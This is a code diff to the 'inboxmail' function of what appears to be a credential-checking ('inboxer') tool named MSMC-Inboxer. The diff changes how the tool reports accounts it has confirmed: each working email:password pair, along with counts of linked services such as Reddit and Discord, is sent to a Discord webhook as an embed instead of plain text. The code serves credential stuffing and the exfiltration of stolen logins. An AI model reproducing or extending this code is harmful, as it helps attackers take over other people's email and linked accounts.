@@ -117,16 +117,38 @@ def inboxmail(email, password):
             continue
         # Discord Webhook
         if any(count > 0 for count in counts.values()):
-                    message = f"**Valid Mail!**\n{email}:{password}\n\n**Capture:**\n"
-                    for service, count in counts.items():
-                        if service == 'Reddit' and count > 1 and reddit_year:
-                            message += f"{service}: {count} ✅ (Estimated Year: {reddit_year})\n"
-                        elif service == 'Discord' and count > 1 and discord_year:
-                            message += f"{service}: {count} ✅ (Estimated Year: {discord_year})\n"
-                        elif count > 0:
-                            message += f"{service}: {count} ✅\n"
-                    
-                    payload = {"content": message}
-        r = requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
-        if r.status_code == 404:
-            input("Hold up! You forgot to provide a webhook for Inbox. Hits are not being logged! Edit addons/Inbox/config.json")
+            embed = {
+                "title": "Valid Mail",
+                "description": f"{email}:{password}",
+                "color": 0x00f556,
+                "fields": [],
+                "footer": {
+                    "text": ".gg/PGer • MSMC-Inboxer"
+                }
+            }
+            
+            for service, count in counts.items():
+                if count > 0:
+                    if service == 'Reddit' and count > 1 and reddit_year:
+                        embed["fields"].append({
+                            "name": service,
+                            "value": f"``{count} Hits (Estimated Year: {reddit_year})``",
+                            "inline": True
+                        })
+                    elif service == 'Discord' and count > 1 and discord_year:
+                        embed["fields"].append({
+                            "name": service,
+                            "value": f"``{count} Hits (Estimated Year: {discord_year})``",
+                            "inline": True
+                        })
+                    else:
+                        embed["fields"].append({
+                            "name": service,
+                            "value": f"``{count} Hits``",
+                            "inline": True
+                        })
+
+            payload = {"embeds": [embed]}
+            r = requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
+            if r.status_code == 404:
+                input("Hold up! You forgot to provide a webhook for Inbox. Hits are not being logged! Edit addons/Inbox/config.json")
